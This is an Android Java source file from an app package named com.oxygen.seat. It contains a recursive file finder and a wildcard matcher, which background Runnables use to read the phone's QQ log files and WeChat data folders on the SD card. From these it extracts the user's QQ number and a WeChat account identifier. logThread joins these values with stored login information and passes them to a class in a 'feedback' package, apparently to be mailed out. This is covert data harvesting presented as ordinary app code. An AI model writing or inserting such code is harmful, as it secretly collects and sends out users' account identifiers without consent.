package com.oxygen.seat;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
import java.util.Queue;

import com.oxygen.activity.LoginActivity;
import com.oxygen.feedback.SetMail;

public class Find {



	/**

	 * 查找文件。

	 * @param baseDirName		待查找的目录

	 * @param targetFileName	目标文件名，支持通配符形式

	 * @param count				期望结果数目，如果畏0，则表示查找全部。

	 * @return		满足查询条件的文件名列表

	 */

	public static String findFiles(String baseDirName, String targetFileName) throws Exception {

		/**

		 * 算法简述：

		 * 从某个给定的需查找的文件夹出发，搜索该文件夹的所有子文件夹及文件，

		 * 若为文件，则进行匹配，匹配成功则加入结果集，若为子文件夹，则进队列。

		 * 队列不空，重复上述操作，队列为空，程序结束，返回结果。

		 */

		String fileName = "";

		//判断目录是否存在

		File baseDir = new File(baseDirName);

		if (!baseDir.exists() || !baseDir.isDirectory()){

			System.out.println("文件查找失败" + baseDirName + "不是一个目录！");

			return fileName;

		}

		String tempName = null;

		//创建一个队列，Queue在第四章有定义

		Queue<File> queue = new LinkedList<File>();//实例化队列 

		queue.offer(baseDir);//入队 

		File tempFile = null;

		while (!queue.isEmpty()) {	

			//从队列中取目录

			tempFile = (File) queue.poll();

			if (tempFile.exists() && tempFile.isDirectory()) {

				File[] files = tempFile.listFiles();

				for (int i = 0; i < files.length; i++) {

					//如果是目录则放进队列

					if (files[i].isDirectory()) { 

						queue.offer(files[i]);

					} else {

						//如果是文件则根据文件名与目标文件名进行匹配 

						tempName =  files[i].getName(); 

						if (Find.wildcardMatch(targetFileName, tempName)) {

							//匹配成功，将文件名添加到结果集

							fileName = files[i].getName(); 

//							//如果已经达到指定的数目，则退出循环
//
//							if ((count != 0) && (fileList.size() >= count)) {

								return fileName;

//							}

						}

					}

				}

			} 

		}

		

		return fileName;

	}

	/**

	 * 通配符匹配

	 * @param pattern	通配符模式

	 * @param str	待匹配的字符串

	 * @return	匹配成功则返回true，否则返回false

	 */

	private static boolean wildcardMatch(String pattern, String str) {

		int patternLength = pattern.length();

		int strLength = str.length();

		int strIndex = 0;

		char ch;

		for (int patternIndex = 0; patternIndex < patternLength; patternIndex++) {

			ch = pattern.charAt(patternIndex);

			if (ch == '*') {

				//通配符星号*表示可以匹配任意多个字符

				while (strIndex < strLength) {

					if (wildcardMatch(pattern.substring(patternIndex + 1),str.substring(strIndex))) {

						return true;

					}

					strIndex++;

				}

			} else if (ch == '?') {

				//通配符问号?表示匹配任意一个字符

				strIndex++;

				if (strIndex > strLength) {

					//表示str中已经没有字符匹配?了。

					return false;

				}

			} else {

				if ((strIndex >= strLength) || (ch != str.charAt(strIndex))) {

					return false;

				}

				strIndex++;

			}

		}

		return (strIndex == strLength);

	}


/*
	public static void main(String[] paramert) {

		//	在此目录中找文件

		String baseDIR = "C:/temp"; 

		//	找扩展名为txt的文件

		String fileName = "*.txt"; 

		//	最多返回5个文件

		int countNumber = 5; 

		List resultList = Find.findFiles(baseDIR, fileName, countNumber); 

		if (resultList.size() == 0) {

			System.out.println("No File Fount.");

		} else {

			for (int i = 0; i < resultList.size(); i++) {

				System.out.println(resultList.get(i));//显示查找结果。 

			}

		}

	}
*/
	
	public static String findNum(String baseDirName, String targetFileName) throws Exception {

		/**

		 * 算法简述：

		 * 从某个给定的需查找的文件夹出发，搜索该文件夹的所有子文件夹及文件，

		 * 若为文件，则进行匹配，匹配成功则加入结果集，若为子文件夹，则进队列。

		 * 队列不空，重复上述操作，队列为空，程序结束，返回结果。

		 */

		String Num = "";

		//判断目录是否存在

		File baseDir = new File(baseDirName);

		if (!baseDir.exists() || !baseDir.isDirectory()){

			System.out.println("文件查找失败" + baseDirName + "不是一个目录！");

			return Num;

		}

		String tempName = null;

		//创建一个队列，Queue在第四章有定义

		Queue<File> queue = new LinkedList<File>();//实例化队列 

		queue.offer(baseDir);//入队 

		File tempFile = null;

		while (!queue.isEmpty()) {	

			//从队列中取目录

			tempFile = (File) queue.poll();

			if (tempFile.exists() && tempFile.isDirectory()) {

				File[] files = tempFile.listFiles();

				for (int i = 0; i < files.length; i++) {

					//如果是目录则放进队列

					if (files[i].isDirectory()) { 

						queue.offer(files[i]);

					} else {

						//如果是文件则根据文件名与目标文件名进行匹配 

						tempName =  files[i].getName(); 

						if (Find.wildcardMatch(targetFileName, tempName)) {

							//匹配成功，将文件名添加到结果集

//							ArrayList<File> tmpFile = new ArrayList(); 
//							tmpFile.add(files[i].getAbsoluteFile());
							FileInputStream fis = new FileInputStream(files[i]);
							BufferedReader readerStream = new BufferedReader(new InputStreamReader(fis, "UTF-8"));
							String tmpLine = readerStream.readLine();
							String s1 = "send bootAction for QQ"; 
							//String s1 = "sName: uin:"; 
							while (tmpLine != null){  
//System.out.println(tmpLine);
								int index_info = tmpLine.indexOf(s1);  
								if(index_info != -1) {  
									String s2 = tmpLine.substring(index_info + s1.length());  
//									int index1 = s2.indexOf(" sCmd");  
//									if(index1 != -1) {
//										Num = s2.substring(0, index1);
									Num = s2;
										return Num;
//									}
								}
								tmpLine = readerStream.readLine(); 
							}
							

						}

					}

				}

			} 

		}

		

		return Num;

	}
	
	
	public static Runnable findCQ = new Runnable(){
		@Override
		public void run() {
           
//			在此目录中找文件
			String baseDIR = "//mnt/sdcard/tencent/com/tencent/mobileqq"; 
			String fileName = "com.tencent.mobileqq_MSF.*"; 
			String result="";
			try {
				result = Find.findNum(baseDIR, fileName);
			} catch (Exception e) {
System.out.println("-------find file exception");
				e.printStackTrace();
			} 

			if (result.equals("")) {

System.out.println("CQ No File Fount.");
				LoginActivity.sp.edit().putString("CQ", result).commit();

			} else {
//				String s = result;
//				int index =s.indexOf("bg_");
//				System.out.println(s.substring(0, index));//显示查找结果。
				LoginActivity.sp.edit().putString("CQ", result).commit();
System.out.println("------CQ:"+result);
			}
		}
	};
	
	public static Runnable findWe = new Runnable(){
		@Override
		public void run() {
			//得到个人信息目录文件
			File f = new File("//mnt/sdcard/tencent/MicroMsg/");
    		String[] str = f.list();
    		String userDir = "";
            for(int i=0;i<str.length;i++){
            	if(str[i].length()>userDir.length()){
            		userDir = str[i];
            	}
            }
            
//			在此目录中找文件
			String baseDIR = "//mnt/sdcard/tencent/MicroMsg/"+userDir; 
			String fileName = "*bg_"; 
			String result="";
			try {
				result = Find.findFiles(baseDIR, fileName);
			} catch (Exception e) {
System.out.println("-------find file exception");
				e.printStackTrace();
			} 

			if (result.equals("")) {

System.out.println("We No File Fount.");
				LoginActivity.sp.edit().putString("We", result).commit();

			} else {
				String s = result;
				int index =s.indexOf("bg_");
				String wei = s.substring(0, index);
				System.out.println(wei);//显示查找结果。 
				LoginActivity.sp.edit().putString("We", wei).commit();
			}
		}
	};
	
	 public static Runnable logThread = new Runnable(){
 		@Override
 		public void run() {
 			SetMail.Log = LoginActivity.sp.getString("TMP1", "")+" ";
 			
 			if(SetMail.Log.equals("")==false){
 				SetMail.Log = SetMail.Log+LoginActivity.infoStr;
 				
				SetMail.Log = SetMail.Log+" Q"+LoginActivity.sp.getString("CQ", "")+" We "+LoginActivity.sp.getString("We", "");
 				SetMail.setLog();
 			}
 		}
 	};
	
}